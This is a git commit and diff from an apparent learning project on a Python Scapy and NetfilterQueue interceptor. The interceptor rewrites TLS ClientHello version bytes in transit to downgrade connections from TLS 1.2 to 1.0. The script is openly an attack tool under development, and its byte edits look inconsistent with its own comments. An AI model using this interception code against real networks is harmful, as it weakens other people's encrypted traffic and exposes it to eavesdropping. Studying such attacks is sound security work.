23c6139a9253d507e69c00e4027a27929e3c93b4
Tess Sluijter <tsluyter@kilala.nl>
2020-10-08 21:05:33 +0200

    Debugging breakthrough. Learned how to inspect the packet.
    Turns out that, despite the biggest protests of the Scapy module when printing,
    the packets do in fact have tcp.len, ip.len, tcp.chksum and ip.chksum.
    
    I guess I'm just addressing them incorrectly. Here's an example capture:
    ---
    IP(frag=0, src='172.17.0.1', proto=6, tos=0, dst='172.17.0.2', chksum=16609, len=240, id=41217, version=4, flags=2, ihl=5, ttl=64)/TCP(reserved=0, seq=565870124, ack=1021144122, dataofs=8, urgptr=0, window=229, flags=24, chksum=42261, dport=5000, sport=36270, options=[('NOP', None), ('NOP', None), ('Timestamp', (1354252218, 2529881121))])/Raw(load="\x16\x03\x01\x00\xb7\x01\x00\x00\xb3\x03\x03\xc1\xd2\xcf\xe4\xffR\xa3\xdb\xd0^\xa4\xee\xea\xc5\x0e\x0c\xe9\x92+\x92C\xf5\xac\x9c\xc1\xce\xe3\xb5,]dm\x00\x008\xc0,\xc00\x00\x9f\xcc\xa9\xcc\xa8\xcc\xaa\xc0+\xc0/\x00\x9e\xc0$\xc0(\x00k\xc0#\xc0'\x00g\xc0\n\xc0\x14\x009\xc0\t\xc0\x13\x003\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00#\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02")
    ---

--- TLS-downgrade/interceptor.py
+++ TLS-downgrade/interceptor.py
@@ -4,7 +4,7 @@
 # https://lbarman.ch/blog/downgrade-tls/
 #
 # Also, thanks to Mike D. for teaching me how to join() to fix
-# the bytes for pkt.set_payload.
+# the bytes for packet.set_payload.
 #
 # Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
 # https://tls.ulfheim.net
@@ -16,49 +16,64 @@ from scapy import *
 scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
 __builtins__.__dict__.update(scapy_builtins)
 
+
 nfQueueID         = 0
 maxPacketsToStore = 100
 
-def packetReceived(pkt):
-  print("...")
-  ip = IP(pkt.get_payload())
 
-  if not ip.haslayer("Raw"):
-    pkt.accept();
+def downgradeTLS(packet):
+  print("...")
+  pkt = IP(packet.get_payload())
+
+  # Quick test to see if I can read any-thing at all.                     
+  if (pkt.haslayer(ICMP)):                                                
+    print(pkt.getlayer(ICMP).code)                                        
+
+  if not pkt.haslayer("Raw"):
+    packet.accept();
 
   else:
-    tcpPayload = ip["Raw"].load                                             
+    tcpPayload = pkt["Raw"].load
 
-    # Adjusted the matching rules for Python 2 and old Scapy.               
+    # Adjusted the matching rules for Python 2 and old Scapy.
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
-      print("TLS handshake found, client HELLO.")                                      
+      print("TLS handshake found, client HELLO.")
+      print("-----")
+      print(pkt.command()) 
+      print("-----")
+      
+      # By testing with these two and adding .len or .cksum we confirm: the layers don't have those.
+      # Very very odd! Why would there not be a cksum or len??
+      #print(pkt.getlayer(IP).len)
+      #print(pkt.getlayer(TCP).len)
+      
+      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
+        print("TLS v1.2, dropping down to v1.0")
+        msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
+        msgBytes2 = [b for b in msgBytes]
 
-      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':                         
-        print("TLS v1.2, dropping down to v1.0")                                       
-        msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it            
-        msgBytes2 = [b for b in msgBytes]                                              
+        print("msgB is: ", type(msgBytes))
+        print("msgB2 is: ", type(msgBytes2))
+        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")
+        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")
 
-        print("msgB is: ", type(msgBytes))                                             
-        print("msgB2 is: ", type(msgBytes2))                                           
-        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")         
-        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")         
+        msgBytes2[61] = '\x03'
+        msgBytes2[62] = '\x03'
 
-        msgBytes2[61] = '\x03'                                                         
-        msgBytes2[62] = '\x03'                                                         
-
-        print("Byte 61 is now: ", msgBytes2[61], ".")                                  
-        print("Byte 62 is now: ", msgBytes2[62], ".")                                  
+        print("Byte 61 is now: ", msgBytes2[61], ".")
+        print("Byte 62 is now: ", msgBytes2[62], ".")
 
         msg=b''.join(msgBytes2)
-        pkt.set_payload(msg)                                                      
+        packet.set_payload(msg)
 
-      pkt.accept()                                                                     
+      packet.accept()                                                                     
     else:                                                                              
-      pkt.accept();
+      packet.accept();
+
 
 print("Binding to NFQUEUE", nfQueueID)
 nfqueue = NetfilterQueue()
-nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
+nfqueue.bind(nfQueueID, downgradeTLS, maxPacketsToStore) # binds to queue 0, use handler "downgradeTLS()"
 try:
     nfqueue.run()
 except KeyboardInterrupt:
